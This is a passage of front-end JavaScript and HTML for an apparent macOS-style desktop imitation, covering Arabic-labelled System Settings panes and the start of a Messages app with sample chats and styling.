                        <div class="settings-item" data-pane="storage-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V8h16v10z" fill="currentColor"></path></svg>
                            <span>التخزين</span>
                        </div>
                    </div>
                </div>
                <div class="settings-content">
                    <div id="appearance-pane" class="settings-pane">
                        <div class="appearance-content">
                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">المظهر</h3>
                                </div>
                                <div class="section-content">
                                    <div class="appearance-options">
                                        <div class="appearance-option selected" data-theme="light">
                                            <div class="appearance-preview light-preview">
                                                <div class="preview-window">
                                                    <div class="preview-titlebar"></div>
                                                    <div class="preview-content"></div>
                                                </div>
                                            </div>
                                            <div class="appearance-label">
                                                <div class="radio-button selected"></div>
                                                <span>فاتح</span>
                                            </div>
                                        </div>
                                        <div class="appearance-option" data-theme="dark">
                                            <div class="appearance-preview dark-preview">
                                                <div class="preview-window dark">
                                                    <div class="preview-titlebar dark"></div>
                                                    <div class="preview-content dark"></div>
                                                </div>
                                            </div>
                                            <div class="appearance-label">
                                                <div class="radio-button"></div>
                                                <span>داكن</span>
                                            </div>
                                        </div>
                                        <div class="appearance-option" data-theme="auto">
                                            <div class="appearance-preview auto-preview">
                                                <div class="preview-window auto">
                                                    <div class="preview-titlebar auto"></div>
                                                    <div class="preview-content auto"></div>
                                                </div>
                                            </div>
                                            <div class="appearance-label">
                                                <div class="radio-button"></div>
                                                <span>تلقائي</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">لون التمييز</h3>
                                </div>
                                <div class="section-content">
                                    <div class="accent-colors">
                                        <div class="accent-color selected" data-color="blue" style="background-color: #007AFF;"></div>
                                        <div class="accent-color" data-color="purple" style="background-color: #AF52DE;"></div>
                                        <div class="accent-color" data-color="pink" style="background-color: #FF2D92;"></div>
                                        <div class="accent-color" data-color="red" style="background-color: #FF3B30;"></div>
                                        <div class="accent-color" data-color="orange" style="background-color: #FF9500;"></div>
                                        <div class="accent-color" data-color="yellow" style="background-color: #FFCC02;"></div>
                                        <div class="accent-color" data-color="green" style="background-color: #34C759;"></div>
                                        <div class="accent-color" data-color="teal" style="background-color: #5AC8FA;"></div>
                                        <div class="accent-color" data-color="cyan" style="background-color: #32ADE6;"></div>
                                        <div class="accent-color" data-color="indigo" style="background-color: #5856D6;"></div>
                                        <div class="accent-color" data-color="gray" style="background-color: #8E8E93;"></div>
                                        <div class="accent-color" data-color="dark-gray" style="background-color: #636366;"></div>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">حجم أيقونات الشريط الجانبي</h3>
                                </div>
                                <div class="section-content">
                                    <div class="slider-container">
                                        <div class="slider-labels">
                                            <span class="slider-label">صغير</span>
                                            <span class="slider-value" id="sidebar-size-display">16</span>
                                            <span class="slider-label">كبير</span>
                                        </div>
                                                                                 <div class="slider-track">
                                             <input type="range" id="sidebar-icon-size" min="12" max="20" value="16" class="mac-slider ios-style">
                                         </div>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">شريط التمرير</h3>
                                </div>
                                <div class="section-content">
                                    <div class="radio-group">
                                        <label class="radio-option">
                                            <input type="radio" name="scrollbar" value="always" class="mac-radio">
                                            <span class="radio-custom"></span>
                                            <span class="radio-label">دائماً</span>
                                        </label>
                                        <label class="radio-option">
                                            <input type="radio" name="scrollbar" value="automatic" checked class="mac-radio">
                                            <span class="radio-custom"></span>
                                            <span class="radio-label">تلقائي</span>
                                        </label>
                                        <label class="radio-option">
                                            <input type="radio" name="scrollbar" value="never" class="mac-radio">
                                            <span class="radio-custom"></span>
                                            <span class="radio-label">أبداً</span>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">متصفح الويب الافتراضي</h3>
                                </div>
                                <div class="section-content">
                                    <div class="select-container">
                                        <select id="default-browser" class="mac-select">
                                            <option value="safari">Safari</option>
                                            <option value="chrome">Google Chrome</option>
                                            <option value="firefox">Firefox</option>
                                            <option value="edge">Microsoft Edge</option>
                                        </select>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">العناصر الحديثة</h3>
                                </div>
                                <div class="section-content">
                                    <div class="checkbox-group">
                                        <label class="checkbox-option">
                                            <input type="checkbox" id="recent-apps" checked class="mac-checkbox">
                                            <span class="checkbox-custom"></span>
                                            <span class="checkbox-label">التطبيقات</span>
                                        </label>
                                        <label class="checkbox-option">
                                            <input type="checkbox" id="recent-documents" checked class="mac-checkbox">
                                            <span class="checkbox-custom"></span>
                                            <span class="checkbox-label">المستندات</span>
                                        </label>
                                        <label class="checkbox-option">
                                            <input type="checkbox" id="recent-servers" class="mac-checkbox">
                                            <span class="checkbox-custom"></span>
                                            <span class="checkbox-label">الخوادم</span>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">عدد العناصر الحديثة</h3>
                                </div>
                                <div class="section-content">
                                    <div class="slider-container">
                                        <div class="slider-labels">
                                            <span class="slider-label">5</span>
                                            <span class="slider-value" id="recent-count-display">10</span>
                                            <span class="slider-label">50</span>
                                        </div>
                                                                                 <div class="slider-track">
                                             <input type="range" id="recent-items-count" min="5" max="50" value="10" class="mac-slider ios-style">
                                         </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="wallpaper-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الخلفية</h2>
                        <div class="wallpaper-grid">
                            <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/1a42e634-f588-40e9-941b-60cf3f20aa39/dflzkpn-5cf9b61b-0e85-4dfb-868e-0e8bca0ec3f8.jpg/v1/fill/w_1280,h_720,q_75,strp/abstract_macbook_wallpaper_by_wallswiftnet_dflzkpn-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6IlwvZlwvMWE0MmU2MzQtZjU4OC00MGU5LTk0MWItNjBjZjNmMjBhYTM5XC9kZmx6a3BuLTVjZjliNjFiLTBlODUtNGRmYi04NjhlLTBlOGJjYTBlYzNmOC5qcGciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.CkAtwyLDj08LA-y1S6lqMVN_jyo1NgzEQFbaq2Dtslo" class="wallpaper-thumb active">
                            <img src="https://source.unsplash.com/random/800x600?macos,sonoma" class="wallpaper-thumb">
                            <img src="https://source.unsplash.com/random/800x600?macos,ventura" class="wallpaper-thumb">
                            <img src="https://source.unsplash.com/random/800x600?abstract" class="wallpaper-thumb">
                        </div>
                        <div class="mt-6">
                            <label for="wallpaper-upload" class="upload-btn">رفع صورة...</label>
                            <input type="file" id="wallpaper-upload" class="hidden" accept="image/*">
                        </div>
                    </div>
                     <div id="dock-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الشريط السفلي والقائمة</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="dock-size">حجم الأيقونات</label>
                                <input type="range" id="dock-size" min="40" max="80" value="52">
                            </div>
                             <div class="settings-list-item">
                                <label for="dock-magnification">التكبير</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="dock-magnification" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="notifications-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الإشعارات</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="notifications-enabled">تفعيل الإشعارات</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="notifications-enabled" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="notification-sound">صوت الإشعارات</label>
                                <select id="notification-sound" class="border rounded px-2 py-1">
                                    <option value="default">افتراضي</option>
                                    <option value="glass">زجاج</option>
                                    <option value="chime">نغمة</option>
                                </select>
                            </div>
                            <div class="settings-list-item">
                                <label for="notification-duration">مدة عرض الإشعار</label>
                                <select id="notification-duration" class="border rounded px-2 py-1">
                                    <option value="3">3 ثواني</option>
                                    <option value="5" selected>5 ثواني</option>
                                    <option value="10">10 ثواني</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div id="privacy-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الخصوصية والأمان</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="location-services">خدمات الموقع</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="location-services" class="sr-only peer">
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="camera-access">الوصول للكاميرا</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="camera-access" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="microphone-access">الوصول للميكروفون</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="microphone-access" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="accessibility-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">إمكانية الوصول</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="zoom-enabled">تكبير الشاشة</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="zoom-enabled" class="sr-only peer">
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="high-contrast">تباين عالي</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="high-contrast" class="sr-only peer">
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="text-size">حجم النص</label>
                                <select id="text-size" class="border rounded px-2 py-1">
                                    <option value="small">صغير</option>
                                    <option value="medium" selected>متوسط</option>
                                    <option value="large">كبير</option>
                                    <option value="extra-large">كبير جداً</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div id="sound-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الصوت</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="system-volume">مستوى الصوت</label>
                                <div class="flex items-center gap-4">
                                    <input type="range" id="system-volume" min="0" max="100" value="50" class="mac-slider ios-style flex-1">
                                    <span id="volume-display" class="slider-value">50%</span>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <label for="alert-volume">صوت التنبيهات</label>
                                <div class="flex items-center gap-4">
                                    <input type="range" id="alert-volume" min="0" max="100" value="30" class="mac-slider ios-style flex-1">
                                    <span id="alert-display" class="slider-value">30%</span>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <label for="sound-effects">أصوات النظام</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="sound-effects" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="network-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الشبكة</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <span>Wi-Fi</span>
                                <div class="flex items-center gap-2">
                                    <span class="text-green-500">متصل</span>
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class="text-green-500">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="currentColor"></path></svg>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <span>اسم الشبكة</span>
                                <span class="text-gray-600">MyWiFi_Network</span>
                            </div>
                            <div class="settings-list-item">
                                <label for="auto-join-wifi">الانضمام التلقائي</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="auto-join-wifi" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="storage-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">التخزين</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <span>المساحة المستخدمة</span>
                                <span class="text-gray-600">127.5 GB من 512 GB</span>
                            </div>
                            <div class="settings-list-item">
                                <div class="w-full">
                                    <div class="w-full bg-gray-200 rounded-full h-2">
                                        <div class="bg-blue-600 h-2 rounded-full" style="width: 25%"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <span>التطبيقات</span>
                                <span class="text-gray-600">45.2 GB</span>
                            </div>
                            <div class="settings-list-item">
                                <span>الملفات</span>
                                <span class="text-gray-600">32.1 GB</span>
                            </div>
                            <div class="settings-list-item">
                                <span>النظام</span>
                                <span class="text-gray-600">15.8 GB</span>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            const windowEl = createWindow(id, 'System Settings', content, {minWidth: '100vh', minHeight: '450px'});
            
            const settingsItems = windowEl.querySelectorAll('.settings-item');
            const settingsPanes = windowEl.querySelectorAll('.settings-pane');
            settingsItems.forEach(item => {
                item.addEventListener('click', () => {
                    settingsItems.forEach(i => i.classList.remove('active'));
                    item.classList.add('active');
                    const paneId = item.dataset.pane;
                    settingsPanes.forEach(pane => pane.classList.toggle('hidden', pane.id !== paneId));
                });
            });

            const appearanceOptions = windowEl.querySelectorAll('.appearance-option');
            appearanceOptions.forEach(option => {
                option.addEventListener('click', () => {
                    appearanceOptions.forEach(opt => opt.classList.remove('selected'));
                    option.classList.add('selected');
                    
                    const radioButton = option.querySelector('.radio-button');
                    windowEl.querySelectorAll('.radio-button').forEach(btn => btn.classList.remove('selected'));
                    radioButton.classList.add('selected');
                    
                    const theme = option.dataset.theme;
                    if (theme === 'dark') {
                        document.body.classList.add('dark-mode');
                        updateSlidersForDarkMode();
                    } else if (theme === 'light') {
                        document.body.classList.remove('dark-mode');
                        updateSlidersForLightMode();
                    } else if (theme === 'auto') {
                        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                        document.body.classList.toggle('dark-mode', prefersDark);
                        if (prefersDark) {
                            updateSlidersForDarkMode();
                        } else {
                            updateSlidersForLightMode();
                        }
                    }
                });
            });

            const accentColors = windowEl.querySelectorAll('.accent-color');
            accentColors.forEach(color => {
                color.addEventListener('click', () => {
                    accentColors.forEach(c => c.classList.remove('selected'));
                    color.classList.add('selected');
                    
                    const colorName = color.dataset.color;
                    const colorMap = {
                        'blue': '#007AFF',
                        'purple': '#AF52DE',
                        'pink': '#FF2D92',
                        'red': '#FF3B30',
                        'orange': '#FF9500',
                        'yellow': '#FFCC02',
                        'green': '#34C759',
                        'teal': '#5AC8FA',
                        'cyan': '#32ADE6',
                        'indigo': '#5856D6',
                        'gray': '#8E8E93',
                        'dark-gray': '#636366'
                    };
                    
                    const selectedColor = colorMap[colorName];
                    document.documentElement.style.setProperty('--accent-color', selectedColor);
                    
                    const accentElements = document.querySelectorAll('.settings-item.active');
                    accentElements.forEach(el => {
                        el.style.backgroundColor = selectedColor;
                    });
                });
            });

            const sidebarIconSize = windowEl.querySelector('#sidebar-icon-size');
            const sidebarSizeDisplay = windowEl.querySelector('#sidebar-size-display');
            sidebarIconSize.addEventListener('input', (e) => {
                const size = e.target.value;
                sidebarSizeDisplay.textContent = size;
                document.documentElement.style.setProperty('--sidebar-icon-size', `${size}px`);
                
                const percentage = ((size - 12) / (20 - 12)) * 100;
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${percentage}%, #e5e5e7 ${percentage}%, #e5e5e7 100%)`;
            });
            
            const sidebarPercentage = ((16 - 12) / (20 - 12)) * 100;
            sidebarIconSize.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${sidebarPercentage}%, #e5e5e7 ${sidebarPercentage}%, #e5e5e7 100%)`;

            const recentItemsCount = windowEl.querySelector('#recent-items-count');
            const recentCountDisplay = windowEl.querySelector('#recent-count-display');
            recentItemsCount.addEventListener('input', (e) => {
                const count = e.target.value;
                recentCountDisplay.textContent = count;
                
                const percentage = ((count - 5) / (50 - 5)) * 100;
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${percentage}%, #e5e5e7 ${percentage}%, #e5e5e7 100%)`;
            });
            
            const recentPercentage = ((10 - 5) / (50 - 5)) * 100;
            recentItemsCount.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${recentPercentage}%, #e5e5e7 ${recentPercentage}%, #e5e5e7 100%)`;

            windowEl.querySelectorAll('.mac-radio').forEach(radio => {
                radio.addEventListener('change', (e) => {
                    const value = e.target.value;
                    if (value === 'always') {
                        document.body.style.setProperty('--scrollbar-visibility', 'visible');
                    } else if (value === 'never') {
                        document.body.style.setProperty('--scrollbar-visibility', 'hidden');
                    } else {
                        document.body.style.setProperty('--scrollbar-visibility', 'auto');
                    }
                });
            });

            const defaultBrowser = windowEl.querySelector('#default-browser');
            defaultBrowser.addEventListener('change', (e) => {
                console.log('Default browser changed to:', e.target.value);
            });

            const recentApps = windowEl.querySelector('#recent-apps');
            const recentDocuments = windowEl.querySelector('#recent-documents');
            const recentServers = windowEl.querySelector('#recent-servers');
            
            [recentApps, recentDocuments, recentServers].forEach(checkbox => {
                checkbox.addEventListener('change', (e) => {
                    console.log(`${e.target.id}:`, e.target.checked ? 'enabled' : 'disabled');
                });
            });
            
            windowEl.querySelector('.appearance-option[data-theme="light"]').classList.add('selected');
            windowEl.querySelector('.accent-color[data-color="blue"]').classList.add('selected');
            
            function updateSlidersForDarkMode() {
                const sliders = windowEl.querySelectorAll('.mac-slider.ios-style');
                sliders.forEach(slider => {
                    const value = slider.value;
                    const max = slider.max;
                    const min = slider.min;
                    const percentage = ((value - min) / (max - min)) * 100;
                    slider.style.background = `linear-gradient(to right, #0A84FF 0%, #0A84FF ${percentage}%, #424245 ${percentage}%, #424245 100%)`;
                });
            }
            
            function updateSlidersForLightMode() {
                const sliders = windowEl.querySelectorAll('.mac-slider.ios-style');
                sliders.forEach(slider => {
                    const value = slider.value;
                    const max = slider.max;
                    const min = slider.min;
                    const percentage = ((value - min) / (max - min)) * 100;
                    slider.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${percentage}%, #e5e5e7 ${percentage}%, #e5e5e7 100%)`;
                });
            }

            const wallpaperThumbs = windowEl.querySelectorAll('.wallpaper-thumb');
            const wallpaperUploadInput = windowEl.querySelector('#wallpaper-upload');
            wallpaperThumbs.forEach(thumb => {
                thumb.addEventListener('click', () => {
                    document.body.style.backgroundImage = `url('${thumb.src}')`;
                    wallpaperThumbs.forEach(t => t.classList.remove('active'));
                    thumb.classList.add('active');
                });
            });
            wallpaperUploadInput.addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        document.body.style.backgroundImage = `url('${event.target.result}')`;
                        wallpaperThumbs.forEach(t => t.classList.remove('active'));
                    };
                    reader.readAsDataURL(file);
                }
            });

            windowEl.querySelector('#dock-size').addEventListener('input', (e) => {
                document.documentElement.style.setProperty('--dock-item-size', `${e.target.value}px`);
            });
            windowEl.querySelector('#dock-magnification').addEventListener('change', (e) => {
                dock.classList.toggle('magnification-enabled', e.target.checked);
            });

            const systemVolume = windowEl.querySelector('#system-volume');
            const volumeDisplay = windowEl.querySelector('#volume-display');
            const alertVolume = windowEl.querySelector('#alert-volume');
            const alertDisplay = windowEl.querySelector('#alert-display');

            systemVolume.addEventListener('input', (e) => {
                const value = e.target.value;
                volumeDisplay.textContent = `${value}%`;
                
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${value}%, #e5e5e7 ${value}%, #e5e5e7 100%)`;
            });

            alertVolume.addEventListener('input', (e) => {
                const value = e.target.value;
                alertDisplay.textContent = `${value}%`;
                
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${value}%, #e5e5e7 ${value}%, #e5e5e7 100%)`;
            });
            
            systemVolume.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF 50%, #e5e5e7 50%, #e5e5e7 100%)`;
            alertVolume.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF 30%, #e5e5e7 30%, #e5e5e7 100%)`;

            const zoomEnabled = windowEl.querySelector('#zoom-enabled');
            const highContrast = windowEl.querySelector('#high-contrast');
            const textSize = windowEl.querySelector('#text-size');

            zoomEnabled.addEventListener('change', (e) => {
                if (e.target.checked) {
                    document.body.style.zoom = '1.2';
                } else {
                    document.body.style.zoom = '1';
                }
            });

            highContrast.addEventListener('change', (e) => {
                document.body.classList.toggle('high-contrast', e.target.checked);
            });

            textSize.addEventListener('change', (e) => {
                const sizes = {
                    'small': '0.875rem',
                    'medium': '1rem',
                    'large': '1.125rem',
                    'extra-large': '1.25rem'
                };
                document.body.style.fontSize = sizes[e.target.value];
            });

            const locationServices = windowEl.querySelector('#location-services');
            const cameraAccess = windowEl.querySelector('#camera-access');
            const microphoneAccess = windowEl.querySelector('#microphone-access');

            locationServices.addEventListener('change', (e) => {
                console.log('Location services:', e.target.checked ? 'enabled' : 'disabled');
            });

            cameraAccess.addEventListener('change', (e) => {
                console.log('Camera access:', e.target.checked ? 'enabled' : 'disabled');
            });

            microphoneAccess.addEventListener('change', (e) => {
                console.log('Microphone access:', e.target.checked ? 'enabled' : 'disabled');
            });

            const notificationsEnabled = windowEl.querySelector('#notifications-enabled');
            const notificationSound = windowEl.querySelector('#notification-sound');
            const notificationDuration = windowEl.querySelector('#notification-duration');

            notificationsEnabled.addEventListener('change', (e) => {
                console.log('Notifications:', e.target.checked ? 'enabled' : 'disabled');
            });

            notificationSound.addEventListener('change', (e) => {
                console.log('Notification sound changed to:', e.target.value);
            });

            notificationDuration.addEventListener('change', (e) => {
                console.log('Notification duration changed to:', e.target.value);
            });

            const soundEffects = windowEl.querySelector('#sound-effects');
            soundEffects.addEventListener('change', (e) => {
                console.log('Sound effects:', e.target.checked ? 'enabled' : 'disabled');
            });

            const autoJoinWifi = windowEl.querySelector('#auto-join-wifi');
            autoJoinWifi.addEventListener('change', (e) => {
                console.log('Auto-join WiFi:', e.target.checked ? 'enabled' : 'disabled');
            });
        }
        
        function openMessagesApp() {
            const id = 'messages';
            if (openWindows.has(id)) {
                bringToFront(openWindows.get(id));
                return;
            }
            const content = `
                <div class="messages-app">
                    <div class="messages-sidebar">
                        <div class="messages-header">
                            <h3>Messages</h3>
                            <button class="new-message-btn">+</button>
                        </div>
                        <div class="conversations-list">
                            <div class="conversation-item active">
                                <div class="contact-avatar">👤</div>
                                <div class="conversation-info">
                                    <div class="contact-name">John Doe</div>
                                    <div class="last-message">Hey, how are you?</div>
                                </div>
                            </div>
                            <div class="conversation-item">
                                <div class="contact-avatar">👩</div>
                                <div class="conversation-info">
                                    <div class="contact-name">Jane Smith</div>
                                    <div class="last-message">Meeting at 3 PM?</div>
                                </div>
                            </div>
                            <div class="conversation-item">
                                <div class="contact-avatar">👨</div>
                                <div class="conversation-info">
                                    <div class="contact-name">Mike Johnson</div>
                                    <div class="last-message">Thanks for the help!</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="chat-area">
                        <div class="chat-header">
                            <div class="chat-contact">
                                <div class="contact-avatar">👤</div>
                                <div class="contact-name">John Doe</div>
                            </div>
                        </div>
                        <div class="chat-messages">
                            <div class="message received">
                                <div class="message-content">Hey, how are you?</div>
                                <div class="message-time">2:30 PM</div>
                            </div>
                            <div class="message sent">
                                <div class="message-content">I'm doing great! How about you?</div>
                                <div class="message-time">2:32 PM</div>
                            </div>
                            <div class="message received">
                                <div class="message-content">Pretty good! Are you free for coffee later?</div>
                                <div class="message-time">2:33 PM</div>
                            </div>
                        </div>
                        <div class="chat-input-area">
                            <div class="chat-input-container">
                                <input type="text" class="chat-input" placeholder="iMessage" id="message-input-${id}">
                                <button class="send-btn" id="send-btn-${id}">↑</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            const windowEl = createWindow(id, 'Messages', content, {minWidth: '100vw', minHeight: '100vh'});
            
            const messagesStyle = document.createElement('style');
            messagesStyle.textContent = `
                .messages-app {
                    display: flex;
                    height: 100%;
                    background: #f5f5f7;
                    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
                }
                
                .messages-sidebar {
                    width: 320px;
                    background: #ffffff;
                    border-right: 1px solid #d1d1d6;
                    display: flex;
                    flex-direction: column;
                }
                
                .messages-header {
                    padding: 20px;
                    border-bottom: 1px solid #d1d1d6;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    height: 72px;
                    box-sizing: border-box;
                }
                
                .messages-header h3 {
                    margin: 0;
                    font-size: 18px;
                    font-weight: 600;
                    color: #1d1d1f;
                    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                }
                
                .new-message-btn {
                    width: 24px;
                    height: 24px;
                    border-radius: 50%;
                    border: none;
                    background: #007AFF;
                    color: white;
                    font-size: 18px;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    transition: all 0.2s ease;
                }
                
                .new-message-btn:hover {
                    background: #0056CC;
                    transform: scale(1.1);
                }
                
                .conversations-list {
                    flex: 1;
                    overflow-y: auto;
                }
                
                .conversation-item {
                    display: flex;
                    align-items: center;
                    padding: 12px 16px;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                    border-bottom: 1px solid #f0f0f0;
                }
                
                .conversation-item:hover {
                    background-color: #f8f8f8;
                }
                
                .conversation-item.active {
                    background-color: #007AFF;
                    color: white;
                }
                
                .contact-avatar {
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    background: #e5e5e7;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 18px;
                    margin-right: 12px;
                }
                
                .conversation-info {
                    flex: 1;
                }
                
                .contact-name {
                    font-weight: 500;
                    font-size: 14px;
                    margin-bottom: 2px;
                }
                
                .last-message {
                    font-size: 12px;
                    color: #86868b;
                    line-height: 1.3;
                }
                
                .conversation-item.active .last-message {
                    color: rgba(255, 255, 255, 0.8);
                }
                
                .chat-area {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    background: #ffffff;
                }
                
                .chat-header {
                    padding: 16px;
                    border-bottom: 1px solid #e5e5e7;
                    display: flex;
                    align-items: center;
                }
                
                .chat-contact {
                    display: flex;
                    align-items: center;
                }
                
                .chat-messages {
                    flex: 1;
                    padding: 16px;
                    overflow-y: auto;
                    display: flex;
                    flex-direction: column;
                    gap: 12px;
                }
